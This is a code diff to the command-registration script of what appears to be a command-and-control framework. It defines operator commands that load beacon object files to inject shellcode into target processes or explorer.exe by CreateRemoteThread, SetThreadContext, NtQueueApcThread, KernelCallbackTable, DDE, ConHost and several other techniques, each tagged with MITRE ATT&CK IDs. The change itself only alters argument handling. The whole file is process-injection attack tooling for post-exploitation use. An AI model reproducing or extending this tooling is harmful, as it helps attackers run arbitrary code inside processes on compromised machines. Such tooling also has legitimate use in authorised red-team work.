@@ -11,7 +11,7 @@ function execBof(id, cmdline, bofname, args, msg, ttp) {
     let bof_path = ax.script_dir() + bofname + "/" + bofname + "." + ax.arch(id) + ".o";
     let task_msg = (msg && msg !== "") ? msg : "Tasked agent to run " + bofname + " BOF";
     if (ttp && ttp !== "") task_msg += " (" + ttp + ")";
-    let exec_cmd = args ? `execute bof ${bof_path} ${args}` : `execute bof ${bof_path}`;
+    let exec_cmd = args ? `execute bof "${bof_path}" ${args}` : `execute bof "${bof_path}"`;
     ax.execute_alias(id, cmdline, exec_cmd, task_msg);
 }
 
@@ -22,11 +22,11 @@ let createremotethread_cmd = ax.create_command(
     "createremotethread <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 createremotethread_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-createremotethread_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+createremotethread_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 createremotethread_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "createremotethread", args,
         `Injecting shellcode into PID ${pid} via CreateRemoteThread`, "T1055.003");
 });
@@ -38,11 +38,11 @@ let setthreadcontext_cmd = ax.create_command(
     "setthreadcontext <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 setthreadcontext_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-setthreadcontext_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+setthreadcontext_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 setthreadcontext_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "setthreadcontext", args,
         `Injecting shellcode into PID ${pid} via SetThreadContext`, "T1055.003");
 });
@@ -54,11 +54,11 @@ let ntcreatethread_cmd = ax.create_command(
     "ntcreatethread <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 ntcreatethread_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-ntcreatethread_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+ntcreatethread_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 ntcreatethread_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "ntcreatethread", args,
         `Injecting shellcode into PID ${pid} via NtCreateThread`, "T1055.003");
 });
@@ -70,11 +70,11 @@ let ntqueueapcthread_cmd = ax.create_command(
     "ntqueueapcthread <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 ntqueueapcthread_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-ntqueueapcthread_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+ntqueueapcthread_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 ntqueueapcthread_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "ntqueueapcthread", args,
         `Injecting shellcode into PID ${pid} via NtQueueApcThread`, "T1055.004");
 });
@@ -86,11 +86,11 @@ let kernelcallbacktable_cmd = ax.create_command(
     "kernelcallbacktable <pid> <shellcode_file>"
 );
 kernelcallbacktable_cmd.addArgInt("pid", true, "target GUI process PID");
-kernelcallbacktable_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+kernelcallbacktable_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 kernelcallbacktable_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "kernelcallbacktable", args,
         `Injecting shellcode into PID ${pid} via KernelCallbackTable`, "T1055.013");
 });
@@ -102,11 +102,11 @@ let tooltip_cmd = ax.create_command(
     "tooltip <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 tooltip_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-tooltip_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+tooltip_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 tooltip_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "tooltip", args,
         `Injecting shellcode into PID ${pid} via Tooltip`, "T1055");
 });
@@ -117,10 +117,10 @@ let uxsubclassinfo_cmd = ax.create_command(
     "Inject shellcode via UxSubclassInfo (targets explorer.exe).",
     "uxsubclassinfo <shellcode_file>"
 );
-uxsubclassinfo_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+uxsubclassinfo_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 uxsubclassinfo_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("bin", [shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("bytes", [shellcode]);
     execBof(id, cmdline, "uxsubclassinfo", args,
         "Injecting shellcode via UxSubclassInfo into explorer.exe", "T1055");
 });
@@ -132,11 +132,11 @@ let clipboardinject_cmd = ax.create_command(
     "clipboardinject <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 clipboardinject_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-clipboardinject_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+clipboardinject_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 clipboardinject_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "clipboardinject", args,
         `Injecting shellcode into PID ${pid} via Clipboard`, "T1055");
 });
@@ -148,11 +148,11 @@ let conhost_cmd = ax.create_command(
     "conhost <pid> <shellcode_file>\n  pid=0: inject into spawnto process"
 );
 conhost_cmd.addArgInt("pid", true, "target PID (0 = spawnto)");
-conhost_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+conhost_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 conhost_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "conhost", args,
         `Injecting shellcode into PID ${pid} via ConHost`, "T1055");
 });
@@ -163,10 +163,10 @@ let ctray_cmd = ax.create_command(
     "Inject shellcode via CTray system tray (targets explorer.exe).",
     "ctray <shellcode_file>"
 );
-ctray_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+ctray_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 ctray_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("bin", [shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("bytes", [shellcode]);
     execBof(id, cmdline, "ctray", args,
         "Injecting shellcode via CTray into explorer.exe", "T1055");
 });
@@ -177,10 +177,10 @@ let dde_cmd = ax.create_command(
     "Inject shellcode via DDE (targets explorer.exe, fires 4 times).",
     "dde <shellcode_file>"
 );
-dde_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+dde_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 dde_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("bin", [shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("bytes", [shellcode]);
     execBof(id, cmdline, "dde", args,
         "Injecting shellcode via DDE into explorer.exe (x4)", "T1055,T1559.002");
 });
@@ -192,11 +192,11 @@ let svcctrl_cmd = ax.create_command(
     "svcctrl <pid> <shellcode_file>"
 );
 svcctrl_cmd.addArgInt("pid", true, "target service process PID");
-svcctrl_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
+svcctrl_cmd.addArgFile("shellcode_file", true, "path to raw shellcode file");
 svcctrl_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
     let pid = parsed_json["pid"];
-    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
-    let args = ax.bof_pack("int,bin", [pid, shellcode]);
+    let shellcode = parsed_json["shellcode_file"];
+    let args = ax.bof_pack("int,bytes", [pid, shellcode]);
     execBof(id, cmdline, "svcctrl", args,
         `Injecting shellcode into service PID ${pid} via SvcCtrl`, "T1055");
 });
